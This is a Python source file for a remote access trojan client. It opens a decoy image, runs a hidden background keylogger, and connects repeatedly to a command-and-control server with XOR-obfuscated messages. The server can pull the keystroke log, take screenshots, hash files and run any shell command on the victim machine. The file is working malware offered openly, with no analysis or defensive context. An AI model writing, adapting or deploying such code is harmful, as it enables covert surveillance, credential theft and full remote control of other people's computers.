import socket
import json
import os
import sys
import time
import threading
import hashlib
import base64
import io
import subprocess
from pynput.keyboard import Listener
from PIL import ImageGrab

# --- Network Configuration ---
# C2 Server listening IP address ('127.0.0.1' for local machine testing)
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 8080

# Pre-shared 8-bit XOR key for payload obfuscation (must match server)
KEY = b'simple_xor_key'

# Set working directory to the current script location
try:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    if script_dir:
        os.chdir(script_dir)
except Exception:
    pass


def xor_crypt(data: bytes) -> bytes:
    """
    Applies symmetric XOR encryption/decryption using the static key.
    
    :param data: Input byte payload.
    :return: Processed byte payload.
    """
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))


def send_msg(sock: socket.socket, obj: dict):
    """
    Encodes dictionary payload into JSON, encrypts via XOR,
    and transmits with a 4-byte big-endian length header prefix.
    """
    try:
        raw = json.dumps(obj).encode()
        enc = xor_crypt(raw)
        length = len(enc).to_bytes(4, 'big')
        sock.sendall(length + enc)
    except Exception:
        pass


def recv_msg(sock: socket.socket) -> dict:
    """
    Reads 4-byte length prefix header, receives binary payload,
    decrypts XOR data, and deserializes JSON structure.
    """
    length_bytes = sock.recv(4)
    if not length_bytes:
        raise ConnectionError("C2 connection terminated.")
    length = int.from_bytes(length_bytes, 'big')
    data = b''
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            raise ConnectionError("Stream interrupted while receiving payload.")
        data += chunk
    dec = xor_crypt(data)
    return json.loads(dec.decode('latin-1'))


def handle_screencap(sock: socket.socket):
    """
    Captures primary screen display, encodes JPEG image to base64,
    and returns response payload to server.
    """
    try:
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format="JPEG")
        img_str = base64.b64encode(buffer.getvalue()).decode()
        send_msg(sock, {"result": "[+] Screenshot captured!", "data": img_str})
    except Exception as e:
        send_msg(sock, {"result": f"[-] Screenshot failed: {e}"})


def handle_hash(sock: socket.socket, filename: str):
    """
    Calculates SHA-256 hash checksum for requested file path.
    """
    try:
        target = filename if filename else "logs.txt"
        if not os.path.exists(target):
            send_msg(sock, {"result": f"[-] Error: {target} not found."})
            return
        h = hashlib.sha256()
        with open(target, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                h.update(chunk)
        send_msg(sock, {"result": f"[+] SHA256 ({target}): {h.hexdigest()}"})
    except Exception as e:
        send_msg(sock, {"result": f"[-] Hash error: {str(e)}"})


def start_keylogger():
    """
    Asynchronous keylogger appending pressed keys to local file logs.txt.
    """
    def on_press(key):
        with open("logs.txt", "a") as f:
            f.write(f"{key} ")

    with Listener(on_press=on_press) as listener:
        listener.join()


def open_decoy_image():
    """
    Launches local decoy file image.jpg using Windows native viewer.
    """
    decoy_file = "image.jpg"
    if os.path.exists(decoy_file):
        try:
            if os.name == 'nt':
                os.startfile(decoy_file)
            else:
                subprocess.Popen(["xdg-open", decoy_file])
        except Exception:
            pass


def connecting():
    """
    Primary client execution loop:
    1. Opens decoy image instantly upon click.
    2. Maintains continuous reconnection loop to C2 server socket.
    """
    # 1. Display decoy image
    open_decoy_image()

    # 2. Reconnection socket loop
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))

            while True:
                msg = recv_msg(s)
                action = msg.get("action")

                if action == "terminate":
                    s.close()
                    os._exit(0)
                elif action == "keylog":
                    if os.path.exists("logs.txt"):
                        with open("logs.txt", "r") as f:
                            send_msg(s, {"result": f.read()})
                    else:
                        send_msg(s, {"result": "[-] No logs found."})
                elif action == "screencap":
                    handle_screencap(s)
                elif action == "hash":
                    handle_hash(s, msg.get("filename"))
                else:
                    # Execute command on victim OS
                    proc = subprocess.Popen(action, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    result = proc.stdout.read() + proc.stderr.read()
                    send_msg(s, {"result": result.decode('latin-1')})
        except Exception:
            # Sleep delay before retrying C2 connection
            time.sleep(5)


def main():
    # Start keylogger in background thread
    t = threading.Thread(target=start_keylogger, daemon=True)
    t.start()

    # Execute network listener
    connecting()


if __name__ == "__main__":
    main()